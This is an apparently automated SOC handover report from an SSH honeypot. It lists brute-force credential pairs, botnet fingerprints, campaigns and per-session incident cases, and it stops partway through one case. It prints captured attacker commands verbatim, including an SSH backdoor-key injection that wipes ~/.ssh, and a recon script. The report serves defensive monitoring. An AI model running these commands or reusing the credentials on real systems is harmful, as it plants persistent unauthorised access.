# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-06 |
| **Generated At** | 2026-09-06T16:47:23Z |
| **Shift Time** | 16:47 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **93** |
| Confirmed Threats | **79** |
| False Positives Filtered | **14** (15.0%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **20** |
| High Severity Cases | **48** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **45** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **59** |
| Unique Credential Pairs | **44** |
| Unique Usernames | **11** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **53** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 6 |
| `support` | 4 |
| `pi` | 4 |
| `admin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `support` | 4 |
| `123` | 3 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `support` | `support` | 4 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `123` | 2 |
| `admin` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abc@2025` | `10.0.0.73` | 2026-09-06T12:55:10 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-06T12:55:14 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T12:55:16 |
| `root` | `P4ssw0rd` | `80.94.92.234` | 2026-09-06T12:55:42 |
| `root` | `P4ssword` | `80.94.92.234` | 2026-09-06T12:58:37 |
| `root` | `123` | `23.97.62.112` | 2026-09-06T12:59:11 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-09-06T13:01:07 |
| `kafka` | `Kafka123` | `79.137.76.231` | 2026-09-06T13:02:46 |
| `345gs5662d34` | `345gs5662d34` | `79.137.76.231` | 2026-09-06T13:02:49 |
| `kafka` | `3245gs5662d34` | `79.137.76.231` | 2026-09-06T13:02:49 |
| `root` | `Passw0rd` | `80.94.92.234` | 2026-09-06T13:03:29 |
| `root` | `p4ssword` | `80.94.92.234` | 2026-09-06T13:06:27 |
| `admin` | `admin` | `47.95.234.23` | 2026-09-06T13:10:52 |
| `root` | `p@ssw0rd` | `80.94.92.234` | 2026-09-06T13:15:12 |
| `root` | `passw0rd` | `80.94.92.234` | 2026-09-06T13:17:50 |
| `support` | `support` | `77.90.185.17` | 2026-09-06T13:17:57 |
| `root` | `password` | `80.94.92.234` | 2026-09-06T13:21:37 |
| `support` | `support` | `10.0.0.73` | 2026-09-06T13:21:42 |
| `support` | `support` | `176.53.159.196` | 2026-09-06T13:24:20 |
| `support` | `support` | `138.226.239.233` | 2026-09-06T13:26:55 |
| `jy` | `123` | `10.0.0.73` | 2026-09-06T13:27:58 |
| `jy` | `3245gs5662d34` | `10.0.0.73` | 2026-09-06T13:28:03 |
| `root` | `qwerty` | `80.94.92.234` | 2026-09-06T13:30:52 |
| `root` | `root1` | `80.94.92.234` | 2026-09-06T13:36:01 |
| `root` | `root12` | `80.94.92.234` | 2026-09-06T13:40:13 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-06T13:40:30 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-06T13:40:30 |
| `root` | `1234` | `23.97.62.112` | 2026-09-06T13:47:00 |
| `root` | `root123` | `80.94.92.234` | 2026-09-06T13:48:58 |
| `root` | `root1234` | `80.94.92.234` | 2026-09-06T13:51:32 |
| `root` | `root12345` | `80.94.92.234` | 2026-09-06T13:54:35 |
| `johnson` | `johnson` | `149.202.50.58` | 2026-09-06T13:58:32 |
| `345gs5662d34` | `345gs5662d34` | `149.202.50.58` | 2026-09-06T13:58:34 |
| `johnson` | `3245gs5662d34` | `149.202.50.58` | 2026-09-06T13:58:35 |
| `root` | `root123456` | `80.94.92.234` | 2026-09-06T14:01:13 |
| `root` | `root1234567` | `80.94.92.234` | 2026-09-06T14:06:59 |
| `root` | `root123456789` | `80.94.92.234` | 2026-09-06T14:09:33 |
| `uucp` | `uucp` | `10.0.0.73` | 2026-09-06T14:11:42 |
| `root` | `root1234567890` | `80.94.92.234` | 2026-09-06T14:13:04 |
| `uucp` | `uucp` | `138.226.239.233` | 2026-09-06T14:15:55 |
| `username` | `password` | `77.90.185.17` | 2026-09-06T14:21:46 |
| `jessica` | `jessica123` | `210.245.20.230` | 2026-09-06T14:37:45 |
| `345gs5662d34` | `345gs5662d34` | `210.245.20.230` | 2026-09-06T14:37:51 |
| `jessica` | `3245gs5662d34` | `210.245.20.230` | 2026-09-06T14:37:53 |
| `root` | `Passw0rd!@#$` | `106.75.214.209` | 2026-09-06T14:41:37 |
| `root` | `12345` | `23.97.62.112` | 2026-09-06T14:42:42 |
| `pi` | `raspberryraspberry993311` | `84.242.24.59` | 2026-09-06T14:45:18 |
| `pi` | `raspberry` | `84.242.24.59` | 2026-09-06T14:45:18 |
| `root` | `1z2x3c4v5b` | `172.208.48.177` | 2026-09-06T14:48:17 |
| `345gs5662d34` | `345gs5662d34` | `172.208.48.177` | 2026-09-06T14:48:19 |
| `root` | `3245gs5662d34` | `172.208.48.177` | 2026-09-06T14:48:19 |
| `root` | `123` | `92.118.39.50` | 2026-09-06T14:50:37 |
| `root` | `1234` | `92.118.39.50` | 2026-09-06T14:52:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **93** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 28 |
| libssh | 20 |
| OpenSSH | 8 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 21 | 2 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `390ffe68a68c...` | Modern SSH client | 4 | 2 |
| `c11b200866cf...` | Modern SSH client | 4 | 1 |
| `16443846184e...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 21 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `390ffe68a68c...` | OpenSSH | 4 | 2 | Modern SSH client |
| `c11b200866cf...` | OpenSSH | 4 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |
| **Recon Loader Script** | 🟡 MEDIUM | 20 | 2 | `T1082, T1592, T1078, T1083` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `106.75.214.209`, `210.245.20.230`, `149.202.50.58`, `172.208.48.177`, `79.137.76.231`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch
```
Source IPs: `92.118.39.50`, `80.94.92.234`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **19** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 16 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS134840` | Myanmar Country Co., Ltd. | 1 | HIGH |
| `AS28649` | Desktop Sigmanet Comunicação Multimídia SA | 1 | LOW |
| `AS133385` | Atom Myanmar Limited | 1 | LOW |
| `AS27699` | TELEFÔNICA BRASIL S.A | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (48)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-950ef2346bc5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:55 |
| **Last Seen** | 2026-09-06 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:55:41` | `cowrie.session.connect` |
| `2026-09-06 12:55:41` | `cowrie.client.version` |
| `2026-09-06 12:55:41` | `cowrie.client.kex` |
| `2026-09-06 12:55:42` | `cowrie.login.success` |
| `2026-09-06 12:55:43` | `cowrie.session.params` |
| `2026-09-06 12:55:43` | `cowrie.command.input` |
| `2026-09-06 12:55:43` | `cowrie.log.closed` |
| `2026-09-06 12:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93f28d9faff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:58 |
| **Last Seen** | 2026-09-06 12:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:58:33` | `cowrie.session.connect` |
| `2026-09-06 12:58:33` | `cowrie.client.version` |
| `2026-09-06 12:58:33` | `cowrie.client.kex` |
| `2026-09-06 12:58:37` | `cowrie.login.success` |
| `2026-09-06 12:58:39` | `cowrie.session.params` |
| `2026-09-06 12:58:39` | `cowrie.command.input` |
| `2026-09-06 12:58:40` | `cowrie.log.closed` |
| `2026-09-06 12:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894b078e6c4b

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]112` |
| **First Seen** | 2026-09-06 12:59 |
| **Last Seen** | 2026-09-06 12:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:59:10` | `cowrie.session.connect` |
| `2026-09-06 12:59:10` | `cowrie.client.version` |
| `2026-09-06 12:59:10` | `cowrie.client.kex` |
| `2026-09-06 12:59:11` | `cowrie.login.success` |
| `2026-09-06 12:59:11` | `cowrie.session.params` |
| `2026-09-06 12:59:11` | `cowrie.command.input` |
| `2026-09-06 12:59:12` | `cowrie.log.closed` |
| `2026-09-06 12:59:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]112` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f7a200e51d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:01 |
| **Last Seen** | 2026-09-06 13:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:01:00` | `cowrie.session.connect` |
| `2026-09-06 13:01:01` | `cowrie.client.version` |
| `2026-09-06 13:01:01` | `cowrie.client.kex` |
| `2026-09-06 13:01:07` | `cowrie.login.success` |
| `2026-09-06 13:01:09` | `cowrie.session.params` |
| `2026-09-06 13:01:09` | `cowrie.command.input` |
| `2026-09-06 13:01:10` | `cowrie.log.closed` |
| `2026-09-06 13:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4773e6b85b6

| Field | Detail |
|---|---|
| **Source IP** | `79.137.76[.]231` |
| **First Seen** | 2026-09-06 13:02 |
| **Last Seen** | 2026-09-06 13:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:02:46` | `cowrie.session.connect` |
| `2026-09-06 13:02:46` | `cowrie.client.version` |
| `2026-09-06 13:02:46` | `cowrie.client.kex` |
| `2026-09-06 13:02:46` | `cowrie.login.success` |
| `2026-09-06 13:02:47` | `cowrie.session.params` |
| `2026-09-06 13:02:47` | `cowrie.command.input` |
| `2026-09-06 13:02:47` | `cowrie.command.failed` |
| `2026-09-06 13:02:47` | `cowrie.log.closed` |
| `2026-09-06 13:02:48` | `cowrie.session.params` |
| `2026-09-06 13:02:48` | `cowrie.command.input` |
| `2026-09-06 13:02:48` | `cowrie.session.file_download` |
| `2026-09-06 13:02:48` | `cowrie.log.closed` |
| `2026-09-06 13:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.137.76[.]231` to AbuseIPDB if not already reported
- [ ] Block `79.137.76[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a344a7d8ff43

| Field | Detail |
|---|---|
| **Source IP** | `79.137.76[.]231` |
| **First Seen** | 2026-09-06 13:02 |
| **Last Seen** | 2026-09-06 13:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:02:48` | `cowrie.session.connect` |
| `2026-09-06 13:02:48` | `cowrie.client.version` |
| `2026-09-06 13:02:48` | `cowrie.client.kex` |
| `2026-09-06 13:02:49` | `cowrie.login.success` |
| `2026-09-06 13:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.137.76[.]231` to AbuseIPDB if not already reported
- [ ] Block `79.137.76[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b093c821f32

| Field | Detail |
|---|---|
| **Source IP** | `79.137.76[.]231` |
| **First Seen** | 2026-09-06 13:02 |
| **Last Seen** | 2026-09-06 13:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:02:49` | `cowrie.session.connect` |
| `2026-09-06 13:02:49` | `cowrie.client.version` |
| `2026-09-06 13:02:49` | `cowrie.client.kex` |
| `2026-09-06 13:02:49` | `cowrie.login.success` |
| `2026-09-06 13:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.137.76[.]231` to AbuseIPDB if not already reported
- [ ] Block `79.137.76[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beabe84ec55e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:03 |
| **Last Seen** | 2026-09-06 13:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:03:27` | `cowrie.session.connect` |
| `2026-09-06 13:03:28` | `cowrie.client.version` |
| `2026-09-06 13:03:28` | `cowrie.client.kex` |
| `2026-09-06 13:03:29` | `cowrie.login.success` |
| `2026-09-06 13:03:31` | `cowrie.session.params` |
| `2026-09-06 13:03:31` | `cowrie.command.input` |
| `2026-09-06 13:03:31` | `cowrie.log.closed` |
| `2026-09-06 13:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98630805eba6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:06 |
| **Last Seen** | 2026-09-06 13:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:06:27` | `cowrie.session.connect` |
| `2026-09-06 13:06:27` | `cowrie.client.version` |
| `2026-09-06 13:06:27` | `cowrie.client.kex` |
| `2026-09-06 13:06:27` | `cowrie.login.success` |
| `2026-09-06 13:06:28` | `cowrie.session.params` |
| `2026-09-06 13:06:28` | `cowrie.command.input` |
| `2026-09-06 13:06:28` | `cowrie.log.closed` |
| `2026-09-06 13:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7ee80110b2

| Field | Detail |
|---|---|
| **Source IP** | `47.95.234[.]23` |
| **First Seen** | 2026-09-06 13:09 |
| **Last Seen** | 2026-09-06 13:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:09:50` | `cowrie.session.connect` |
| `2026-09-06 13:09:51` | `cowrie.telnet.option` |
| `2026-09-06 13:09:52` | `cowrie.telnet.option` |
| `2026-09-06 13:10:52` | `cowrie.login.success` |
| `2026-09-06 13:10:52` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.95.234[.]23` to AbuseIPDB if not already reported
- [ ] Block `47.95.234[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e412e6e76667

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:15 |
| **Last Seen** | 2026-09-06 13:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:15:11` | `cowrie.session.connect` |
| `2026-09-06 13:15:11` | `cowrie.client.version` |
| `2026-09-06 13:15:11` | `cowrie.client.kex` |
| `2026-09-06 13:15:12` | `cowrie.login.success` |
| `2026-09-06 13:15:13` | `cowrie.session.params` |
| `2026-09-06 13:15:13` | `cowrie.command.input` |
| `2026-09-06 13:15:14` | `cowrie.log.closed` |
| `2026-09-06 13:15:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47085a16d9f2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:17 |
| **Last Seen** | 2026-09-06 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:17:49` | `cowrie.session.connect` |
| `2026-09-06 13:17:49` | `cowrie.client.version` |
| `2026-09-06 13:17:49` | `cowrie.client.kex` |
| `2026-09-06 13:17:50` | `cowrie.login.success` |
| `2026-09-06 13:17:51` | `cowrie.session.params` |
| `2026-09-06 13:17:51` | `cowrie.command.input` |
| `2026-09-06 13:17:51` | `cowrie.log.closed` |
| `2026-09-06 13:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e63cb25de7e5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 13:17 |
| **Last Seen** | 2026-09-06 13:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
